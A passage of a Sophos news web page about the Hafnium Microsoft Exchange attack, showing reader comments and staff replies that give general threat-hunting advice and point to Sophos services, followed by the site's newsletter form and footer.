				<figure class="gravatar"><img alt='' src='https://secure.gravatar.com/avatar/9a5697f292a91006544f294569c26abd?s=60&#038;d=blank&#038;r=g' srcset='https://secure.gravatar.com/avatar/9a5697f292a91006544f294569c26abd?s=120&#038;d=blank&#038;r=g 2x' class='avatar avatar-60 photo' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													Greg Iddon											</h2>
					<time class="comment-meta-item" datetime="2021-07-08T13:08-04:00" itemprop="datePublished"><a href="#comment-274773" itemprop="url">08 July 2021 at 1:08 pm</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>Threat hunting is a complex activity and it&#8217;s difficult to impart good guidance with limited understanding of the artifacts involved. If they are in need of guidance or assistance with an active threat, reach out to our Rapid Response team for help.  https://www.sophos.com/en-us/products/managed-threat-response/rapid-response.aspx</p>
<p>If there is no evidence of an active threat, but the act of threat hunting is proving too time consuming or complex, Sophos Managed Threat Response is a great service to enable you to offload this responsibility; where our team of experts will conduct threat hunting, detection, investigation, analysis, and response on their behalf.  https://www.sophos.com/en-us/products/managed-threat-response/rapid-response.aspx</p>
<p>If they are looking to learn more about threat hunting, we have our Threat Hunting Academy series that is worth watching.  https://events.sophos.com/ThreatHuntingAcademy</p>
<p>In regards to what they are specifically looking at some rough guidance: the cmdline execution needs reviewing to understand what it was trying to achieve and any activity it spawned, and the process tree should be followed in both directions &#8211; looking through each parent (and parent&#8217;s parent) as well as each child. Use the timestamps from the suspicious artifact that has been identified and use that to review file system activity (file reads and writes) around that time, network connections in the minutes to hours that precede it, and so on.</p>
<p>Also check out the Sophos community https://community.sophos.com/intercept-x-endpoint/</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2021/03/05/hafnium-advice-about-the-new-nation-state-attack/?replytocom=274773#respond' data-commentid="274773" data-postid="73211" data-belowelement="comment-274773" data-respondelement="respond" data-replyto="Reply to Greg Iddon" aria-label='Reply to Greg Iddon'>Reply</a>				</div>
			</div>

	</article></section></article>
		<article class="comment odd alt thread-odd thread-alt depth-1 parent " id="comment-243047" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-one.png' srcset='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-three.png 2x' class='avatar avatar-60 photo avatar-default' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													Anonymous											</h2>
					<time class="comment-meta-item" datetime="2021-03-19T20:56-04:00" itemprop="datePublished"><a href="#comment-243047" itemprop="url">19 March 2021 at 8:56 pm</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>Does hafnium affect a MAC?</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2021/03/05/hafnium-advice-about-the-new-nation-state-attack/?replytocom=243047#respond' data-commentid="243047" data-postid="73211" data-belowelement="comment-243047" data-respondelement="respond" data-replyto="Reply to Anonymous" aria-label='Reply to Anonymous'>Reply</a>				</div>
			</div>

	<section class="child-comments comments-list">
		<article class="comment byuser comment-author-sallyadam even depth-2  bystaff" id="comment-244539" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://secure.gravatar.com/avatar/bddc469d24361536975f5b97aa3accbb?s=60&#038;d=blank&#038;r=g' srcset='https://secure.gravatar.com/avatar/bddc469d24361536975f5b97aa3accbb?s=120&#038;d=blank&#038;r=g 2x' class='avatar avatar-60 photo' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													<a class="comment-author-link" href="http://sallyadam.wordpress.com" itemprop="author">Sally Adam</a>
											</h2>
					<time class="comment-meta-item" datetime="2021-03-25T09:54-04:00" itemprop="datePublished"><a href="#comment-244539" itemprop="url">25 March 2021 at 9:54 am</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>Attackers are exploiting a vulnerability in Microsoft Exchange servers, but once they&#8217;re in your environment they could move laterally to any other platform or operating system such as a Mac. No one knows what the attackers will do next, so it&#8217;s always best to protect all your devices from the start, and have visibility into the activity taking place on those systems.</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2021/03/05/hafnium-advice-about-the-new-nation-state-attack/?replytocom=244539#respond' data-commentid="244539" data-postid="73211" data-belowelement="comment-244539" data-respondelement="respond" data-replyto="Reply to Sally Adam" aria-label='Reply to Sally Adam'>Reply</a>				</div>
			</div>

	</article></section></article>
		<article class="comment odd alt thread-even depth-1 parent " id="comment-243093" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-two.png' srcset='https://news.sophos.com/wp-content/themes/sophosnews-2017/img/avatars/avatar-one.png 2x' class='avatar avatar-60 photo' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													Bjoern Ebner											</h2>
					<time class="comment-meta-item" datetime="2021-03-20T08:47-04:00" itemprop="datePublished"><a href="#comment-243093" itemprop="url">20 March 2021 at 8:47 am</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>I ran the query above in Sophos EDR to establish the impact.</p>
<p>It found some suspicious activity that might be related to a webshell.</p>
<p>After that I opened the process tree for the Sophos PID.</p>
<p>There I saw that csc.exe was called with a parameter that included a cmdline file in some temporary folder.</p>
<p>after that a tmp-file was created in another folder.</p>
<p>How would you suggest to further investigate this?</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2021/03/05/hafnium-advice-about-the-new-nation-state-attack/?replytocom=243093#respond' data-commentid="243093" data-postid="73211" data-belowelement="comment-243093" data-respondelement="respond" data-replyto="Reply to Bjoern Ebner" aria-label='Reply to Bjoern Ebner'>Reply</a>				</div>
			</div>

	<section class="child-comments comments-list">
		<article class="comment byuser comment-author-sallyadam even depth-2  bystaff" id="comment-244536" itemprop="comment" itemscope itemtype="http://schema.org/Comment">
			<div class="comment-wrapper">
				<figure class="gravatar"><img alt='' src='https://secure.gravatar.com/avatar/bddc469d24361536975f5b97aa3accbb?s=60&#038;d=blank&#038;r=g' srcset='https://secure.gravatar.com/avatar/bddc469d24361536975f5b97aa3accbb?s=120&#038;d=blank&#038;r=g 2x' class='avatar avatar-60 photo' height='60' width='60' /></figure>
				<div class="comment-meta post-meta" role="complementary">
					<h2 class="comment-author">
													<a class="comment-author-link" href="http://sallyadam.wordpress.com" itemprop="author">Sally Adam</a>
											</h2>
					<time class="comment-meta-item" datetime="2021-03-25T09:48-04:00" itemprop="datePublished"><a href="#comment-244536" itemprop="url">25 March 2021 at 9:48 am</a></time>
														</div>
				<div class="comment-content post-content" itemprop="text">
					<p>Hi Bjoern, I&#8217;m afraid the answer to your question requires a detailed review of everything you&#8217;re looking at, so is not something we can give you a quick/short answer to.<br />
We recently ran a threat hunting academy which demonstrated how you can use Sophos EDR for threat hunting &#8211; if you didn&#8217;t attend you can watch the recorded sessions &#8211; they will help you conduct your own investigations: https://events.sophos.com/threatacademyondemand<br />
Alternatively, if you need more help, please contact your Sophos account manager and discuss Managed Threat Response.<br />
If you have evidence of an active threat and potential malicious activity taking place in your network, reach out to Sophos Rapid Response: https://www.sophos.com/en-us/products/managed-threat-response/rapid-response.aspx</p>
					<a rel='nofollow' class='comment-reply-link' href='https://news.sophos.com/en-us/2021/03/05/hafnium-advice-about-the-new-nation-state-attack/?replytocom=244536#respond' data-commentid="244536" data-postid="73211" data-belowelement="comment-244536" data-respondelement="respond" data-replyto="Reply to Sally Adam" aria-label='Reply to Sally Adam'>Reply</a>				</div>
			</div>

	</article></section></article></section>
				</div>
	
	
	<div class="container max-w-2xl py-6 md:py-16">
			<div id="respond" class="comment-respond">
		<h3 id="reply-title" class="comment-reply-title">Leave a Reply <small><a rel="nofollow" id="cancel-comment-reply-link" href="/en-us/2021/03/05/hafnium-advice-about-the-new-nation-state-attack/#respond" style="display:none;">Cancel reply</a></small></h3><form action="https://news.sophos.com/wp-comments-post.php" method="post" id="commentform" class="comment-form" novalidate><p class="comment-notes"><span id="email-notes">Your email address will not be published.</span> <span class="required-field-message" aria-hidden="true">Required fields are marked <span class="required" aria-hidden="true">*</span></span></p><p class="comment-form-comment"><label for="comment">Comment <span class="required" aria-hidden="true">*</span></label> <textarea id="comment" name="comment" cols="45" rows="8" maxlength="65525" required></textarea></p><p class="comment-form-author"><label for="author">Name</label> <input id="author" name="author" type="text" value="" size="30" maxlength="245" /></p>
<p class="comment-form-email"><label for="email">Email</label> <input id="email" name="email" type="email" value="" size="30" maxlength="100" aria-describedby="email-notes" /></p>
<p class="comment-form-url"><label for="url">Website</label> <input id="url" name="url" type="url" value="" size="30" maxlength="200" /></p>
<p class="comment-form-cookies-consent"><input id="wp-comment-cookies-consent" name="wp-comment-cookies-consent" type="checkbox" value="yes" /> <label for="wp-comment-cookies-consent">Save my name, email, and website in this browser for the next time I comment.</label></p>
<input type="hidden" name="redirect_to" value="https://news.sophos.com/en-us/2021/03/05/hafnium-advice-about-the-new-nation-state-attack/" id="redirect_to"><p class="form-submit"><input name="submit" type="submit" id="submit" class="submit" value="Post Comment" /> <input type='hidden' name='comment_post_ID' value='73211' id='comment_post_ID' />
<input type='hidden' name='comment_parent' id='comment_parent' value='0' />
</p><p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="115faa79af" /></p><p style="display: none !important;"><label>&#916;<textarea name="ak_hp_textarea" cols="45" rows="8" maxlength="100"></textarea></label><input type="hidden" id="ak_js_1" name="ak_js" value="133"/><script>document.getElementById( "ak_js_1" ).setAttribute( "value", ( new Date() ).getTime() );</script></p></form>	</div><!-- #respond -->
		</div>

</div><!-- #comments -->
</div><!-- #comments -->

		
		</main><!-- #main -->
	</div><!-- #primary -->


	</div> <!-- #content -->

	

<div class="bg-sophos-gray-50 md:py-16 px-4" x-data="subscribeForm()">
	<div class="container max-w-2xl" x-show="!subscribed">
	<div class="text-style-h2-lg">
		Subscribe to get the latest updates in your inbox.	</div>
	<form action="">
		<div class="flex flex-col my-6">
		<input
			type="text"
			placeholder="name@email.com"
			class="w-full"
			x-model="email"
			x-on:keydown="resetErrors()"
			required
		/>
		<div
			x-cloak
			x-show="message"
			x-text="message"
			class="font-sansMedium px-4 py-3 mt-2 text-sm font-medium text-white bg-black border rounded-md"
		></div>
		</div>
		<div class="mb-4 text-lg">
			Which categories are you interested in?		</div>
		<div class="my-2 space-y-1">
		<template
			x-for="category in Object.entries(categories)"
			:key="category[0]"
		>
			<div>
			<label
				x-bind:for="category[1].value"
				class="inline-flex items-center"
			>
				<input
				type="checkbox"
				x-bind:value="category[1].value"
				x-bind:id="category[1].value"
				x-bind:name="category[1].value"
				x-model="subscribeTo"
				/>
				<span
				class="text-style-form-label ml-2"
				x-text="category[1].name"
				>
				</span>
			</label>
			</div>
		</template>
		</div>
		<div class="mt-6">
		<input
			type="submit"
			class="round-button round-button--primary"
			@click.prevent="submit()"
			x-bind:value="buttonText()"
			x-bind:class="{ 'opacity-30 cursor-not-allowed': buttonDisabled() }"
			x-bind:disabled="buttonDisabled()"
		/>
		</div>
	</form>
	</div>

	<div class="container max-w-2xl" x-cloak x-show="subscribed && !loading">
	<div class="text-style-h2 md:text-3xl mb-4 text-2xl text-center">
		You’re now subscribed!	</div>
	<div
		class="text-lg text-center"
		x-text="`Check your email to confirm your subscription.`"
	></div>
	</div>
</div>

<script>
	let subscribeForm = function () {
	return {
		config: {
		endpoints: {
			signup:
			"https://sophos-mailchimp-signup.netlify.app/.netlify/functions/newsletter-signup",
		},
		},
		subscribed: false,
		loading: false,
		error: false,
		message: "",
		categories: {
		1: {
			name: decodeURIComponent( 'Products%20and%20Services' ),
			value: "products-services",
		},
		2: {
			name: decodeURIComponent( 'Threat%20Research' ),
			value: "threat-research",
		},
		3: {
			name: decodeURIComponent( 'Security%20Operations' ),
			value: "security-operations",
		},
		4: {
			name: decodeURIComponent( 'AI%20Research' ),
			value: "ai-research",
		},
		5: {
			name: decodeURIComponent( '%23SophosLife' ),
			value: "sophos-life",
		},
		},
		subscribeTo: [],
		email: "",

		reset() {
		this.loading = false;
		if (!this.error) {
			this.email = "";
		}
		},

		resetErrors() {
		this.error = false;
		this.message = "";
		},

		setError(message) {
		this.error = true;
		this.message = message;
		},

		setSuccess(message) {
		this.error = false;
		this.message = message;
		},

		emailIsValid(email) {
		return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
		},

		submit() {
		this.loading = true;
		this.resetErrors();

		const mcList = "8d6471d831";
		const mcLanguage = decodeURIComponent( 'en' );
		const mcTags = [...this.subscribeTo, mcLanguage];

		const payload = {
			email: this.email,
			listId: mcList,
			tags: mcTags,
			language: mcLanguage,
		};

		fetch(this.config.endpoints.signup, {
			method: "POST",
			headers: {
			"Content-Type": "application/json",
			},
			body: JSON.stringify(payload),
		})
			.then((r) => r.json())
			.then((data) => {
			if (data.status === "pending") {
				this.setSuccess(
					decodeURIComponent( 'You%20have%20been%20subscribed.%20Please%20check%20your%20email%20to%20confirm.' )
				);
				this.subscribed = true;
			} else if (
				data.status === "subscribed"
			) {
				this.setSuccess(
					decodeURIComponent( 'You%20are%20already%20subscribed.%20Thank%20you%21' )
				);
			} else {
				this.setError(
					decodeURIComponent( 'We%20could%20not%20subscribe%20you.%20Please%20try%20again.' )
				);
			}
			})
			.catch((e) => {
			this.setError(
				decodeURIComponent( 'We%20could%20not%20subscribe%20you.%20Please%20try%20again.' )
			);
			})
			.finally(() => {
			this.reset();
			});
		},

		buttonText() {
		return this.loading ? decodeURIComponent( 'Please%20Wait' ) : decodeURIComponent( 'Subscribe' );
		},

		buttonDisabled() {
		return (
			this.subscribeTo.length < 1 ||
			!this.emailIsValid(this.email) ||
			this.loading
		);
		},
	};
	};
</script>


	<footer
		class="bg-white border-t border-sophos-gray-200 "
		x-data="{ languageMenu: false, privacyMenu: false, legalMenu: false }"
	>
		<div class="container">
			<div class="md:flex-row md:items-center flex flex-col justify-between py-8">
				<div class="flex items-baseline flex-grow space-x-6">
					<!-- Language -->
					
<div class="relative mr-auto">
	<a
		href="#"
		class="whitespace-nowrap font-sansMedium text-sophos-gray-600 inline-block text-xs font-medium leading-tight"
		@click.prevent="languageMenu = !languageMenu"
		@click.away="languageMenu = false"
	>
		Change Region		<svg
			xmlns="http://www.w3.org/2000/svg"
			width="8"
			height="4"
			class="inline-block transition-transform transform"
			:class="{'rotate-180': languageMenu }"
		>
			<path
				fill="#7F8C9D"
				fill-rule="evenodd"
				d="M4 2.178L5.915.262a.708.708 0 01.996 0 .702.702 0 010 .995L4.75 3.415A.7.7 0 014 3.94a.702.702 0 01-.751-.524l-2.16-2.158a.702.702 0 11.996-.995L4 2.178z"
			/>
		</svg>
	</a>

	<!-- Language Menu -->
	<div
		class="focus:outline-none border-sophos-gray-200 absolute bottom-0 left-0 w-48 px-4 py-1 py-4 mb-8 -ml-4 origin-bottom-left bg-white border rounded-md shadow-md"
		role="menu"
		aria-orientation="vertical"
		aria-labelledby="user-menu"
		x-show="languageMenu"
		x-cloak
		x-transition:enter="transition-all ease-out duration-100"
		x-transition:enter-start="transform opacity-0 scale-95"
		x-transition:enter-end="transform opacity-100 scale-100"
		x-transition:leave="transition ease-in duration-75"
		x-transition:leave-start="transform opacity-100 scale-100"
		x-transition:leave-end="transform opacity-0 scale-95"
	>
		<ul
			class="font-sansMedium text-sophos-gray-600 space-y-1 text-xs font-medium"
		>
											<li>
					<a href="https://news.sophos.com/es-419">
						América Latina					</a>
				</li>
															<li>
					<a href="https://news.sophos.com/pt-br">
						Brasil					</a>
				</li>
											<li>
					<a href="https://news.sophos.com/de-de">
						Deutschland					</a>
				</li>
											<li>
					<a href="https://news.sophos.com/en-us">
						English					</a>
				</li>
											<li>
					<a href="https://news.sophos.com/fr-fr">
						France					</a>
				</li>
											<li>
					<a href="https://news.sophos.com/es-es">
						Iberia					</a>
				</li>
											<li>
					<a href="https://news.sophos.com/it-it">
						Italia					</a>
				</li>
											<li>
					<a href="https://news.sophos.com/ja-jp">
						Japan					</a>
				</li>
									</ul>
	</div>
</div>

					<!-- Terms -->
					<a
						href="https://www.sophos.com/en-us/legal/sophos-website.aspx"
						class="whitespace-nowrap font-sansMedium text-sophos-gray-600 inline-block ml-auto text-xs font-medium leading-tight"
						>Terms</a
					>

					<!-- Privacy -->
					
<span class="relative">
	<a
		href="#"
		class="whitespace-nowrap font-sansMedium text-sophos-gray-600 inline-block text-xs font-medium leading-tight"
		@click.prevent="privacyMenu = !privacyMenu"
		@click.away="privacyMenu = false"
	>
		Privacy
		<svg
			xmlns="http://www.w3.org/2000/svg"
			width="8"
			height="4"
			class="inline-block transition-transform transform"
			:class="{'rotate-180': privacyMenu }"
		>
			<path
				fill="#7F8C9D"
				fill-rule="evenodd"
				d="M4 2.178L5.915.262a.708.708 0 01.996 0 .702.702 0 010 .995L4.75 3.415A.7.7 0 014 3.94a.702.702 0 01-.751-.524l-2.16-2.158a.702.702 0 11.996-.995L4 2.178z"
			/>
		</svg>
	</a>
	<div
		class="focus:outline-none border-sophos-gray-200 absolute bottom-0 left-0 w-48 px-4 py-1 py-4 mb-8 -ml-4 origin-bottom-left bg-white border rounded-md shadow-md"
		role="menu"
		aria-orientation="vertical"
		aria-labelledby="user-menu"
		x-show="privacyMenu"
		x-cloak
		x-transition:enter="transition-all ease-out duration-100"
		x-transition:enter-start="transform opacity-0 scale-95"
		x-transition:enter-end="transform opacity-100 scale-100"
		x-transition:leave="transition ease-in duration-75"
		x-transition:leave-start="transform opacity-100 scale-100"
		x-transition:leave-end="transform opacity-0 scale-95"
	>
		<ul
			class="font-sansMedium text-sophos-gray-600 space-y-1 text-xs font-medium"
		>
			<li>
				<a
					href="https://www.sophos.com/en-us/legal/sophos-group-privacy-policy.aspx"
				>
					Privacy Notice				</a>
			</li>
			<li>
				<a
					href="https://www.sophos.com/en-us/legal/cookie-information.aspx"
				>
					Cookies				</a>
			</li>
		</ul>
	</div>
</span>

					<!-- Legal -->
					
<span class="relative">
	<a
		href="#"
		class="whitespace-nowrap font-sansMedium text-sophos-gray-600 inline-block text-xs font-medium leading-tight"
		@click.prevent="legalMenu = !legalMenu"
		@click.away="legalMenu = false"
	>
		Legal
		<svg
			xmlns="http://www.w3.org/2000/svg"
			width="8"
			height="4"
			class="inline-block transition-transform transform"
			:class="{'rotate-180': legalMenu }"
		>
			<path
				fill="#7F8C9D"
				fill-rule="evenodd"
				d="M4 2.178L5.915.262a.708.708 0 01.996 0 .702.702 0 010 .995L4.75 3.415A.7.7 0 014 3.94a.702.702 0 01-.751-.524l-2.16-2.158a.702.702 0 11.996-.995L4 2.178z"
			/>
		</svg>
	</a>
	<div
		class="focus:outline-none border-sophos-gray-200 absolute bottom-0 left-0 w-48 px-4 py-1 py-4 mb-8 -ml-4 origin-bottom-left bg-white border rounded-md shadow-md"
		role="menu"
		aria-orientation="vertical"
		aria-labelledby="user-menu"
		x-show="legalMenu"
		x-cloak
		x-transition:enter="transition-all ease-out duration-100"
		x-transition:enter-start="transform opacity-0 scale-95"
		x-transition:enter-end="transform opacity-100 scale-100"
		x-transition:leave="transition ease-in duration-75"
		x-transition:leave-start="transform opacity-100 scale-100"
		x-transition:leave-end="transform opacity-0 scale-95"
	>
		<ul
			class="font-sansMedium text-sophos-gray-600 space-y-1 text-xs font-medium"
		>
			<li>
				<a
					href="https://www.sophos.com/en-us/legal.aspx"
				>
					General				</a>
			</li>
			<li>
				<a
					href="https://www.sophos.com/en-us/legal/modern-slavery-act-transparency-statement.aspx"
				>
					Modern Slavery Statement				</a>
			</li>
			<li>
				<a
					href="https://secure.ethicspoint.eu/domain/media/en/gui/104916/index.html"
				>
					Speak Out				</a>
			</li>
		</ul>
	</div>
</span>

					<!-- Copyright -->
					<div class="md:ml-6 mt-2 md:mt-0">
						<span
							class="whitespace-nowrap font-sansMedium text-sophos-gray-600 inline-block text-xs font-medium leading-tight"
						>
							&copy; 1997 - 2022 Sophos Ltd. All rights reserved						</span>
					</div>
				</div>
			</div>
			</div>
		</div>
	</footer>
	<script id='sophos-js-core-js-extra'>
var PG8Data = {"startPage":"1","maxPages":"1","nextLink":""};
</script>
<script type="text/javascript" src="https://news.sophos.com/_static/??-eJyVjGEOwiAMRi8kZRCn/jGehZBmA6UQWp3Ht2YXGOn36+W92q2ZWEmQxMqKBdlybWtlwo2Nn9zVZtapVJ8JzceDB6cAdgCZT/bQj1j7gI1f6YGP+zuCt6TXeBVDaSEtNBy20IWwD3dLGE7+TKNHubvLfDvPelP+AaC7oEI=" ></script><script src='https://cdn.jsdelivr.net/gh/alpinejs/alpine@v2.8.1/dist/alpine.min.js?ver=2.0.1' id='alpine-js-js'></script>
<script type="text/javascript" src="https://news.sophos.com/wp-includes/js/comment-reply.min.js?m=1658827588g" ></script><script src='https://stats.wp.com/e-202231.js' defer></script>
<script>
	_stq = window._stq || [];
	_stq.push([ 'view', {v:'ext',j:'1:11.1.2',blog:'166161023',post:'73211',tz:'-4',srv:'news.sophos.com',hp:'vip'} ]);
	_stq.push([ 'clickTrackerInit', '166161023', '73211' ]);
</script>
</body>
</html>
